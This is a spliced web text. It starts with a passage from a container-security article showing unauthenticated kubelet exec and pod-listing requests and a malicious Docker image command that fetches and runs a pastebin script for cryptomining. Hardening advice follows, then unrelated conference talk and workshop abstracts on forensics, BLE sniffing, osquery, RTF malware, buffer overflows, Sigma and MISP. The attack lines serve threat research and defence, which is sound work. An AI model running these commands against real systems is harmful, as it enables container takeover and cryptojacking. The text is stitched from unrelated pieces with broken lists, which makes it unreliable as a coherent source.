<p>The exploitation take 2 steps, first a POST request to the exec endpoint:</p>

<p><code class="highlighter-rouge">POST "https://target:10250/exec/&lt;namespace&gt;/&lt;podname&gt;/&lt;container-name&gt;?command=whoami&amp;input=1&amp;output=1&amp;tty=1"</code></p>

<p>Then a GET request (SPDY capable client) using location header from the response of the previous request</p>

<p><code class="highlighter-rouge">wscat -c "https://target:10250/cri/exec/XxXxXxXx" --no-check</code></p>

<p>A single GET request is used to list the available containers on the target:</p>

<p><code class="highlighter-rouge">GET "https://target:10250/pods"</code></p>

<p>Those two examples can be reproduced against most orchestration tools of the API endpoints are not properly secured.</p>

<h3 id="compromising-containers-repositories">compromising containers repositories</h3>

<p>Supply-chain attacks can happen on container image repositories. An attacker could successfully push an update to a well-known container image and just wait for victims to deply/update. Or even creating an account on the repository (let say <code class="highlighter-rouge">Docker Hub</code> for example) and convincing people to use their images.</p>

<p>That is exacly what happen recently with Zuulu2 botnet (see https://github.com/docker/hub-feedback/issues/1809). Somebody pushed a <code class="highlighter-rouge">cryptomining</code> image on Docher Hub and exploit weak configuration to download and run the container image. The image is also used to discover new potential targets.</p>

<h2 id="is-it-legit-">Is it legit ?</h2>

<p>While working on another project, we stumbled accross some strange containers online, so we asked ourself if we could find more of those suspicious stuff. We mostly concentrated on Docker as it is the most popular (so the most targeted)</p>

<p>To do that, we developped some script to extract information on available containers online via their exposed API endpoints and parse the extracted data to highlight potentially “unwanted” containers. Identifying online API is done by leveraging internet scanning services (Shodan, Onyphe and Censys).</p>

<p>Another technique consist of downloading unverifed images (to limit the scope of the investigation, we look for modified <code class="highlighter-rouge">alpine</code> images) from container images repositories and analysing startup scripts of those images. A good tool to perform this task for Docker images is Dive (https://github.com/wagoodman/dive).</p>

<p>In this part, we will present some interesting containers we found running online and drill-down to the TTPs used by the TA behind the supposed infection. Here is some examples (all Docker):</p>

<h3 id="xmrig-image">Xmrig image</h3>

<p>Suspicious level: low</p>

<p>We found some docker image used for cryptocurrency mining which may be suspicious because it is probably the least efficient way to do mining… but we never know.</p>

<h3 id="nice-wget-you-got-there">Nice wget you got there</h3>

<p>Suspicious level: high</p>

<p>Ok this time we are sure it is malicious : <code class="highlighter-rouge">chroot /mnt /bin/sh -c 'yum install wget -y;apt-get install wget -y;rm hrfbyyu.sh;wget https://pastebin.com/raw/h7HiT3uR ...</code></p>

<p>So when the image it started, it will install wget via <code class="highlighter-rouge">yum</code> OR <code class="highlighter-rouge">apt-get</code>, then download and execute a script from <code class="highlighter-rouge">pastebin</code> … does not really look legit …</p>

<p>The script itself is base64 encoded and contains update and persistence mechanisms for Linux and cryptomining activities.</p>

<h3 id="xulu-botnet">Xulu botnet</h3>

<p>Suspicious level: high</p>

<p>Some month ago, a user named <code class="highlighter-rouge">zuulu2</code> on Docker Hub uploaded malicious images perfoming scanning of other potential victims and cryptomining activities. It spread exploiting open Docker API. Malicious images were removed from Docker Hub.</p>

<p>By getting the list of running or available containers, we can see that the zuulu2 images are still running on several servers.</p>

<h3 id="dockerfile-cmd-runsh">Dockerfile: CMD [“/run.sh”]</h3>

<p>We identified this image posted on Docker Hub 6 month ago. User only uploaded one image and the description was just <code class="highlighter-rouge">CMD ["/run.sh"]</code>. By using Dive, we identified modifications from the base image (alpine):</p>

<ul>
  <li>adding a user named <code class="highlighter-rouge">miner</code></li>
  <li>downloading and compiling xmrig</li>
  <li>starting the mining process (XMR)</li>
</ul>

<h2 id="containers-security">Containers security</h2>

<p>The security of a container does not resume only to the container itself. A container is based on an image, which contains all the files required to run. But what if the used image is vulnerable or it has some configuration defects,embedded clear text secrets or it might contain embedded malware, intended to do something else than the initial purpose.</p>

<p>Many images for containers are stored usually in a central location because they are easy to control, reuse, share across the community. Do we trust those  registries or are we sure that the connection to those registries is secure?</p>

<p>Orchestration tools are great for managing the containers. They pull the images from registries , deploy images into containers and manage the running containers. But is it always clearly defined who has access or not?Do we trust the orchestrator node in the cluster? Is it properly separated the network traffic between the containers in the orchestrator configuration ?</p>

<p>Multiple containers share the same OS kernel instance.Each operating system has a container runtime, which coordinates different OS components in such a way that each container sees only its dedicated resources and it is isolated from other containers running at the same time. Anyone with access to the kernel root account can see and access all containers.The attack surface level on the host OS is pretty big. The attacker can attempt to exploit host OS vulnerabilities, tampering file systems or gain priviledged user access rights.</p>

<h3 id="hardening">Hardening</h3>

<p>When you think at hardening a container, you have to take into consideration all the components that make a container up and running. And as there is no clear and concrete security for the containers, we have to find measures to harden every component.
We will present best practices for each component.</p>

<h4 id="container-images-security">Container Images Security</h4>
<ul>
  <li>use only signed images from trusted registry</li>
  <li>visibility into all layers of the image</li>
  <li>validation of the configuration of the images, regular patching updates</li>
  <li>constant monitoring</li>
</ul>

<h4 id="host-security">Host Security</h4>
<ul>
  <li>harden the host</li>
  <li>always patch</li>
  <li>grant authorization wisely,by controlling user access</li>
  <li>separate partitions for containers</li>
  <li>audit all the container’s activity</li>
</ul>

<h4 id="container-runtime-security">Container Runtime Security</h4>
<ul>
  <li>namespaces - what a container can see and to what extenct can interract with each oter internally</li>
  <li>cgroups - how much of shared kernel and system resources a container will consume</li>
  <li>seccomp - secure computing mode</li>
  <li>process restrictions</li>
  <li>device and file restrictions</li>
</ul>

<h4 id="orchestration-environment-security">Orchestration environment security</h4>
<ul>
  <li>limit direct access</li>
  <li>fine-grained-access control rules</li>
  <li>administrative boundaries</li>
  <li>resource quota</li>
  <li>safe management and distribution of secrets</li>
  <li>encrypt data exchange</li>
</ul>

<h3 id="auditing">Auditing</h3>

<p>It is important to continously scan your containers for vulnerabilities of various kinds,including bugs,inadequate authentication and authorization ,embedded secrets and misconfiguration. 
Auditing containers can be challenging, on one side because of their architecture and on the other side the short lifetime and the density of the containers deployed. It becomes really difficult to track what exactly was deployed.</p>

<p>On your host audit regular Linux file system and system calls and also log who is running the container service. Add audit rules for the container service using <strong>auditd</strong>.
Also make sure you have a container-native log collection agent on your host , which provides automatic collection and processing of container logs.</p>

<h3 id="monitoring">Monitoring</h3>

<p>Monitoring your container activity it is essential in identifying security incidents and providing audit trails.
Containered environments require logging at multiple layers - the host, the container orchestrator and the container itself.</p>
<ul>
  <li>monitor and capture host logs</li>
  <li>monitor the container orchestration system used like Docker Swarm, Kubernetes, Apache Mesos and Hashicorp Nomad</li>
  <li>ensure adequate log information at the containers, by setting the log level in your container</li>
</ul>

<h4 id="tools">Tools</h4>

<p>There are different tools out there, which might help you in monitoring your containered environment, but this is not done easily.</p>

<ul>
  <li>docker remote API - The docker engine client provides an API, through which you collect basic monitoring function of Docker containers</li>
  <li>container advisor(cAdvisor) - it consists of a container, which can collect,process,aggregate and export information related to running containers.</li>
  <li>prometheus - monitoring tools that can be used to observe metrics and raise alerts, based on the applied alerting rules over the input data. Everything can be displayed in a UI dashboard,based on Grafana</li>
</ul>

<h2 id="conclusion">Conclusion</h2>

<p>Micro-services are the future they say. Sure thing for cyber-criminals ! As those technologies will be more and more used and most probably in the cloud, SOC teams need to start worrying about the potential impact and how to face those new threats. It will take time. Oh and we did not spoke about serverless services like AWS Lambda …</p>

<p>by Andreia Gaita</p>

<p>In the world of development, what do you do when you run into a bug in the library, framework, or middleware you’re using? You submit a bug report and describe the steps. The companies providing you with the software expect and encourage you to send in repro code, but the bigger the system, the more complex the code needs to be to reproduce the problem. In the case of game development, the expectation is that when you find a bug, you submit a complete test project that exemplifies the problem, so that test teams can reproduce it. What can these test projects contain? How are they tested by companies developing game engines and middleware? What potential exploitation venues does this open?</p>

<p>There are unique conditions in the game industry that make it particularly vulnerable to certain types of attacks, but its uniqueness also makes it somewhat of a puzzle to the rest of the tech industry. In this talk, we’ll go through some of the particulars of how game development works, and how these practices and bug reporting systems can be exploited to gain access to the core of development teams across the game industry.</p>

<p>by Thomas Fischer</p>

<p>Microsoft has slowly been introducing tools to help organisations better manage and troubleshoot Windows performance and issues; these are now entirely integrated into Windows. To improve performance and troubleshooting capabilities, Microsoft introduced System Resource Usage Monitor (SRUM) in Windows 8 and beyond. PowerShell has become the default “command line” management tool for windows administrators. These tools provide both a wealth of information into what has happened and is present on the system.</p>

<p>For Forensics and even Incident Response, these tools are now a go to built-in option to bootstrap and drive the forensics process including opening access to artefacts that overzealous user or even a “smart” attacker has removed. SRUM for instance can provide data points ranging from network to process activitiy providing insight into what, who, when and how an attacker or malicious process introduced itself into the environment.</p>

<p>This talk will help the participant build the foundations to identify which built in tools can assist in the Windows Forensics process and the data points that are available as well as examine how services such as SRUM can be used to extract key data points to provide information for incident response or threat hunting activities.</p>

<p>by Damien Cauquil</p>

<p>Bluetooth Low energy version 5 has been published in late 2016, but we still have
  no sniffer supporting this specific version (and not that much compatible devices
  as well). The problem is this new version introduces a new channel hopping algorithm
  that renders previous sniffing tools useless as devices can no longer be attacked
  and connections analyzed. This new algorithm is based on a brand new pseudo-random
  number generator (PRNG) to provide better collision avoidance while kicking out
  all of our good old sniffing tools.</p>

<p>Unless some random hacker manages to break this not-that-strong PRNG and upgrades
  his BLE sniffing tool to support this algorithm ;). In this talk, we will explain
  why this PRNG is vulnerable and how it can be easily defeated to sniff and jam
  communications between two BLE 5 devices. A new version of BtleJack will be
  released during this talk, providing an efficient way to sniff BLE 5 connections
  to our fellow IoT hacker family.</p>

<p>by Elmar Nabigaev</p>

<p>It is often thought that APT attacks is complex and involve 0-day exploits, stealthy lateral movement and hidden exfiltration path.
While this can be true, it is rarely the case. Even APT actors follow “it if works - don’t broke it” rule and use tried and true tactics. If they can get away with it and achieve their goals, why not?</p>

<p>In this talk I’m going to present our discovery of an APT group which used rather simple TTPs but managed to stay undetected and hidden for years while breaching some high value targets in the fields of government, manufacturing, telecommunications etc.</p>

<p>We’re going to dive deep into incident response cases, dissection of tools and techniques they used to infiltrate targets and cover possible attribution.</p>

<p>I’m also going to talk about problems we faced during responding to these cases and present recommendations how to defend networks against this adversary.</p>

<p>Maintaining real-time insight into the current state of your endpoint infrastructure is crucial.  It is very important from operational, continuous security monitoring, and incident response perspective.  Created by Facebook in 2014, osquery is an open-source instrumentation framework for Windows, OS X (macOS), Linux, and FreeBSD operating systems.</p>

<p>Osquery exposes the operating system as a relational database and allows you to write SQL queries to explore system data.  The generic SQL tables represent running processes, loaded kernel modules, open network connections, browser plugins, hardware events, file hashes, etc.  These SQL tables are implemented via an easy to extend API and several tables already exist and more are being written.  The main advantage of osquery is that it allows you to use one platform for monitoring complex operating system state across an entire infrastructure.  It has a high-performance and low-footprint distributed host monitoring daemon, osquery and also an interactive query console, called osqueryi.</p>

<p>During this two-hour workshop, we will learn about osquery’s capabilities and cover the following topics:</p>
<ul>
  <li>Osquery basics (installation, osqueryi, osqueryd, osquery schema);</li>
  <li>SQL refresher (SELECT, FROM, WHERE, LIKE, JOIN, etc.);</li>
  <li>Osquery configuration (flagfile, scheduled queries, packs, logging, file integrity monitoring, etc.);</li>
  <li>Osquery extensions;</li>
  <li>Fleet management (Kolide Fleet, Doorman, SGT, etc.);</li>
  <li>Integration with log aggregation platforms (Elastic Stack).</li>
</ul>

<p>Technical requirements for the workshop:</p>
<ul>
  <li>A laptop with at least 8 GB of RAM and 30-50 GB of free disk space;</li>
  <li>VMware Workstation, VMware Fusion or VMware Player installed.</li>
</ul>

<p>by Didier Stevens</p>

<p>Rich Text Format (RTF) documents are consumed by many applications, like Microsoft Word.</p>

<p>Malicious RTF documents contain exploits or embedded objects/links: in this workshop, we go through 20+ exercises to learn how to analyze these documents with Didier’s tool rtfdump.py.</p>

<p>Rich Text Format (RTF) documents are also used to deliver a malicious payload. Unlike Word documents, they can not contain VBA macros. To achieve code execution, malware authors have to exploit vulnerabilities, or social engineer the recipient into executing an embedded payload.</p>

<p>Microsoft Equation Editor vulnerabilities are being widely exploited, and this is reflected in the increased popularity of the RTF format with malware authors.</p>

<p>The RTF format also lends itself to many obfuscation tricks, making the task of the analyst much harder.</p>

<p>In this workshop, Didier Stevens will teach you analysis of malicious RTF documents in his typical workshop style: this means hands-on, many exercises, and just a few slides.</p>

<p>by Quentin JEROME</p>

<p><a href="https://github.com/0xrawsec/whids">WHIDS</a> is one of the first open source endpoint detection solution for windows designed with fast Incident Response in mind. It comes with a powerful rule definition format known as <a href="https://github.com/0xrawsec/gene">Gene</a> allowing one to achieve complex detection primitives. One of its strengths compared to other approaches is that it dumps artifacts (process, file, registry) based on the criticality of the events detected. This allows one to collect artifacts as close as possible of the alert generated. This approach reduces considerably the incident response process while putting the focus on artifact analysis automation.</p>

<p>The purpose of this workshop will be twofold. In the first place I will introduce the tool and the rule definition format (30 to 45 mins). In a second part some hands-on with the attendees will be made (the rest of the time). The first part of the hands-on will cover simple WHIDS deployment and tweaking. Then comes a realistic case study. In the first place we will study a technique (or a malware) common to everyone and walk through all the steps leading to the final rule creation. Then the attendees will study on their own a technique or malware sample of their choice and build the appropriate detection rule(s). In the last part we will discuss on the possible implementations in a production environment.</p>

<p>Context-dependent output encoding? Prepared statement with bind variables? Disable external entity resolution? Storing passwords in salted hash format?  If you are involved in Java development, come to my workshop and we will see together, why these are important from a security perspective!</p>

<p>Most vulnerabilities can be prevented by following secure coding best practices from the beginning of the development. As opposed to common misbeliefs, this does not make development more complex or longer. Secure coding becomes more expensive when it is an afterthought and you try to retroactively apply it on a project.</p>

<p>This workshop is meant for developers and security professionals alike. It is delivered by an information security professional with the purpose of demystifying web application secure coding.</p>

<p>During this hands-on workshop, we are going to see not only how common web application vulnerabilities can be prevented, but also common mitigation mistakes and why they are inefficient. We are going to fix together real-life vulnerabilities included, but not limited to:</p>
<ul>
  <li>SQL injection (SQLi);</li>
  <li>XML injection (XXE);</li>
  <li>Cross-site scripting (XSS);</li>
  <li>Cross-site request forgery (CSRF);</li>
  <li>Authentication and authorization issues.</li>
</ul>

<p>We are going to use Java, without putting too much emphasis on framework-specific aspects.</p>

<p>Technical requirements for the workshop:</p>
<ul>
  <li>A laptop with at least 8 GB of RAM and 40-50 GB of free disk space.</li>

<p>At the core of every IoT device is its firmware. Detailed security assessment of devices starts with obtaining a copy of the firmware. The firmware can then be statically analysed or dynamically. Several techniques exist for firmware extraction. 
This workshop takes participants through a low level firmware extraction process which is easy to perform and doesn’t require expensive hardware.</p>

<p>We shall present how do it using a cheap USB to serial adapter.
The workshop will be going through the process with the following steps :</p>
<ol>
  <li>Examining the hardware and find a serial port</li>
  <li>If there is not serial port available, chase the working combinaison of pins to reveal
the serial port</li>
  <li>Setting up of your minicom working environment</li>
  <li>Extracting the firmware</li>
  <li>Analyze</li>

<p>by Antonin Beaujeant</p>

<p>This workshop will explain one of the most known application security vulnerability: the buffer overflow. We will start from the very beginning explaining what a CPU is, how does it executes operations and coordinate with the memory and inputs/outputs in order to run applications. We will then have a programming crash course (C language) then move to a assembly. Don’t worry, we won’t go too deep, just enough to understand the next chapter: understanding, identifying and exploiting a buffer overflow.</p>

<p>What will this workshop teach you?</p>
<ul>
  <li>Understanding the structure and purpose of the CPU and the memory</li>
  <li>Basics of C programming</li>
  <li>Basics of assembly</li>
  <li>Understanding and exploiting basic buffer overflow</li>
</ul>

<p>What this course won’t teach you?</p>
<ul>
  <li>Reverse engineering</li>
  <li>Coding in C or Assembly (although we will briefly cover both)</li>
  <li>Explain, use and create fuzzers</li>
  <li>Create your own shellcode</li>
  <li>Return-Oriented-Programming exploitation (ROP)</li>
</ul>

<p>When a company grows, it becomes difficult to track every Internet exposed assets. Especially nowadays, with the prevalence of shadow IT and shadow Cloud services. Bad guys know it too well, they have tools and do monitor your exposed infrasctructure. You should be the first to uncover a vulnerability or an exposure of sensitive asset before it is exploited for malevolent purposes.</p>

<p>During the workshop, attendees will learn about the data collected by ONYPHE and how they can leverage its power to have a better view on their Internet exposed assets, especially when working in a big corporation. They will be able to deploy the presented scenarios on their own company to understand their exposure.</p>

<p>They will also learn to use the ONYPHE API to poll data and fill an Elasticsearch database and use Kibana to create powerful dashboards to show to their management. We will give them a free 1-month Entreprise subscription.</p>

<p>by Benoit Sevens</p>

<p>In this workshop we will apply the Time Travel Debugging feature of WinDbg, one of the most powerful Windows debuggers, to the field of malware analysis. We will show with concrete examples how this technology can be very effective in reversing complex samples in a timely manner.</p>

<p>Microsoft added Time Travel Debugging to their powerful WinDbg debugger in 2017. This feature is a gift for reverse engineers working in all sort of fields and is clearly gaining in popularity. The most obvious area that benefits from reverse debugging is the one of root cause analysis during vulnerability research. Multiple blog posts and demonstrations have proven this.</p>

<p>However, other fields of reverse engeering can also greatly benefit from this innovation. This workshop will take a look at how we can leverage Time Travel Debugging for efficiently unpacking a complex, multilayered malware sample and solving common malware analysis problems in an alternative manner.</p>

<p>The intended audience for this workshop ranges from those who have a minimal reverse engineering background, to seasoned malware analysts who are interested in new approaches.</p>

<p>A basic knowledge of x86 Assembly is recommended. Experience in WinDbg is not required.</p>

  <li>Sharing Sigma rules with MISP</li>
  <li>Using generic log sources to write portable rules</li>
  <li>Using content modifiers for regular expressions, expression of obfuscation techniques and other advanced stuff.</li>
</ul>

<p>Further, we will explore the current and evolving ecosystem around Sigma.</p>

<p>The following prerequisites are recommended for going through the hands-on excercises:</p>

<ul>
  <li>A Unix environment</li>
  <li>Ability to run Docker containers from the Internet</li>
  <li>Python &gt;= 3.6 with dependencies from Sigma</li>
  <li>The cloned Sigma workshop repository: https://github.com/thomaspatzke/sigma-workshop (pull updates short before workshop!)</li>
  <li>A MISP instance that can be used for test events (I recommend MISP-dockerized from DCSO: https://github.com/DCSO/MISP-dockerized)</li>
</ul>

<p>by Saad Kadhi</p>

<p>Investigating cyberattacks is now the norm, instead of the exception. The threat landscape keeps changing at a worrying pace while security analysts have to deal with growing complexity, learn new technologies and continuously adapt to rapidly evolving IT environments.</p>

<p>To ease up their burden and enable them to give the best out of themselves in order to fulfil their important mission, while avoiding the so-called analyst fatigue, they should not be asked to master copying and pasting between different tools and interfaces to get their job done. They should not be asked to follow procedures without clearly understanding them and contributing into their improvement.</p>

<p>Humans have brains, even if the deafening speeches about artificial intelligence and machine learning would want us to believe otherwise. It’s more than time to place humans back at the centre and offer them solutions that get out of their way yet support them in their incident response journey, to learn, adapt, and collaborate at every stage. We are social animals after all, aren’t we?</p>

<p>This is exactly what <a href="https://misp-project.org">MISP Project</a> and <a href="https://thehive-project.org">TheHive Project</a> are all about, providing not only free, open source products to sustain the daily activities of blue teams around the globe, but products that actually work and integrate with one another to cover the full spectrum of incident response, ranging from detection to recovery and cyber threat intelligence production and sharing.</p>

<p>So come join us for three hours of <strong>practical</strong> incident response where <strong>automation</strong> and <strong>collaboration</strong> play a paramount role, using MISP, the <em>de facto</em> standard for threat sharing, TheHive, a Security Incident Response Platform and Cortex, a powerful analysis and active response engine.</p>

<p>This workshop will take you through a journey where we’ll cover the six steps of incident response coated with CTI-related activities to investigate a real world incident, leveraging automation and collaboration whenever applicable.</p>

<p>After a brief introduction to MISP, TheHive and Cortex, we’ll dive in the preparation steps to not only set up correctly the tools but establish a proper team organisation, create workflows and get ready for trouble as trouble will come just afterwards, as in the movies. Indeed, now that a threat has just materialised, what are you going to do? And how you would bring out the social animal in you to collaborate with fellow defenders in the room?</p>

<p>The clock is ticking and the fun is on!</p>
